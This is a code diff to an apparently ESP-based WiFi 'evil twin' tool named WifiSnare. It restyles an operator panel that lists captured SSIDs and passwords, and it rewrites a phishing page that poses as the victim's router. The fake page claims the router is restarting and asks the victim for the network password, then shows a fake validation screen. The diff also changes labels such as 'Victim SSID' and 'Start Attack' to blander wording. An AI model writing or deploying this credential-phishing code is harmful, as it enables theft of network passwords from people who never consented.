@@ -33,7 +33,7 @@ String credisetsSSIDPage() {
                        "<style>"
                        "body {color: white;justify-content: center;align-items: center;background-color: black;font-family: Arial, sans-serif;text-align: center;}"
                        "h2 {display: inline-block;border: 2px solid orange;border-radius: 5px;letter-spacing: 5px;padding: 10px;margin-bottom: 1rem;}"
-                       "input[type='text'] {padding: 12px;margin: 5px 10px;border: 2px solid #7CB9E8;border-radius: 4px;background-color: #333;color: white;font-size: 16px;width: 60%;display: block;margin: 20px auto;}"
+                       "input[type='text'] {padding: 12px;margin: 5px 10px;border: 2px solid #7CB9E8;border-radius: 4px;background-color: black;color: white;font-size: 16px;width: 60%;display: block;margin: 20px auto;}"
                        "button {color: white;padding: 12px 20px;margin: 5px 10px;border: none;border-radius: 4px;background-color: #00AB66;cursor: pointer;font-size: 16px;width: 40%;display: block;margin: 10px auto;}"
                        "button:hover {opacity: 0.8;}"
                        "hr {border: none;height: 2px;background-color: #FFC72C;margin: 20px auto;width: 90%;}"
@@ -42,12 +42,12 @@ String credisetsSSIDPage() {
                        "<body>"
                        "<h2>WifiSnare</h2>"
                        "<form method='post' action='/attack'>"
-                       "<input type='text' name='victim_ssid' placeholder='Enter Victim SSID' required>"
-                       "<button type='submit'>Start Attack</button>"
-                       "</form>"
-                       "<hr>";
+                       "<input type='text' name='victim_ssid' placeholder='Enter SSID' required>"
+                       "<button type='submit'>Capture</button>"
+                       "</form>";
 
     if (capturedPassword != "") {
+        credisets += "<hr>";
         credisets += "<h1>Captured Credentials</h1>";
         credisets += "<p>SSID: " + victimSSID + "</p>";
         credisets += "<p>Password: " + capturedPassword + "</p>";
@@ -74,51 +74,54 @@ String credisetsSSIDPage() {
 
 String phisingPage() {
     String victimPassword = "<!DOCTYPE html>"
-                            "<html lang='en'>"
-                            "<head>"
-                            "<style>"
-                            "body{color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
-                            "nav{background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em;}"
-                            "nav b{display: block; font-size: 1.5em; margin-bottom: 0.5em;}"
-                            "div{padding: 0.5em;}"
-                            "input[type='password']{width: 100%; padding: 10px; box-sizing: border-box;}"
-                            "button{background-color: #232023; display: inline-block; height: 38px; padding: 0 20px; margin-top: 5px; color: white; text-align: center; font-size: 11px; font-weight: 600; line-height: 38px; letter-spacing: .1rem; background: #2f3136; border-radius: 4px; border: none; cursor: pointer; box-sizing: border-box;}"
-                            "</style>"
-                            "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                            "<title>" + victimSSID + " : Sign Up</title>"
-                            "</head>"
-                            "<body>"
-                            "<nav><b>" + victimSSID + "</b>Router Info.</nav>"
-                            "<div>Due to internal problems, the router is being restarted.<br>Enter password to re-connect to the network.</div>"
-                            "<form method='post' action='/validate'>"
-                            "<b>Password</b>"
-                            "<center>"
-                            "<input type='password' name='password'>"
-                            "<button type='submit'>Sign Up</button>"
-                            "</center>"
-                            "</form>"
-                            "<div><center>&#169; All rights reserved.</center></div>"
-                            "</body>"
-                            "</html>";
+							"<html lang='en'>"
+							"<head>"
+							"<meta charset='UTF-8'>"
+							"<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+							"<title>" + victimSSID + " : Sign Up</title>"
+							"<style>"
+							"body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
+							"nav{background: #0066ff;color: #fff;padding: 1em;}"
+							"nav b{font-size: 1.5em;}"
+							"div{padding: 0.5em;text-align: center;}"
+							"form{display: flex;flex-direction: column;align-items: center;}"
+							"input[type='password']{width: 100%;padding: 10px;box-sizing: border-box;max-width: 600px;margin-bottom: 10px;}"
+							"button{background-color: #2f3136;color: white;font-size: 11px;font-weight: 600;padding: 10px 20px;border: none;border-radius: 4px;cursor: pointer;}"
+							"footer{padding: 1em;text-align: center;font-size: 14px;}"
+							"</style>"
+							"</head>"
+							"<body>"
+							"<nav><b>" + victimSSID + "</b><br>Router Info.</nav>"
+							"<div>Due to internal problems, the router is being restarted.<br>Please enter your password to re-connect to the network.</div>"
+							"<form method='post' action='/validate'>"
+							"<b>Password</b><br>"
+							"<input type='password' name='password' required><br>"
+							"<button type='submit'>Sign Up</button>"
+							"</form>"
+							"<footer>&#169; All rights reserved.</footer>"
+							"</body>"
+							"</html>";
 
     return victimPassword;
 }
 
 String updatePage(bool success) {
     String updateMessage = "<!DOCTYPE html>"
-                           "<html lang='en'>"
-                           "<head>"
-                           "<style>"
-                           "body{color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
-                           "nav{background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em;}"
-                           "nav b{display: block; font-size: 1.5em; margin-bottom: 0.5em;}"
-                           "div{padding: 0.5em;}"
-                           "</style>"
-                           "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                           "<title>" + victimSSID + " : Validation Panel</title>"
-                           "</head>"
-                           "<body>"
-                           "<nav><b>" + victimSSID + "</b>Validation Panel</nav>";
+						   "<html lang='en'>"
+						   "<head>"
+						   "<meta charset='UTF-8'>"
+						   "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+						   "<title>" + victimSSID + " : Validation Panel</title>"
+						   "<style>"
+						   "body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
+						   "nav{background: #0066ff;color: #fff;padding: 1em;}"
+						   "nav b{font-size: 1.5em;}"
+						   "div{padding: 0.5em;text-align: center;}"
+						   "footer{padding: 1em;text-align: center;font-size: 14px;}"
+						   "</style>"
+						   "</head>"
+						   "<body>"
+						   "<nav><b>" + victimSSID + "</b><br>Validation Panel</nav>";
 
     if (success) {
         updateMessage += "<div>Thank You.<br>Your router will restart soon.</div>";
@@ -131,9 +134,9 @@ String updatePage(bool success) {
                          "</script>";
     }
 
-    updateMessage += "<div><center>&#169; All rights reserved.</center></div>"
-                     "</body>"
-                     "</html>";
+    updateMessage += "<footer>&#169; All rights reserved.</footer>"
+					 "</body>"
+					 "</html>";
 
     return updateMessage;
 }
@@ -172,7 +175,7 @@ void handleValidation() {
         String html_data = updatePage(true);
         webServer.send(200, "text/html", html_data);
         blinkLED(3);
-        delay(2000);
+        delay(3000);
         WiFi.softAPdisconnect(true);
         WiFi.softAP(ssid, password);
         attackStarted = false;
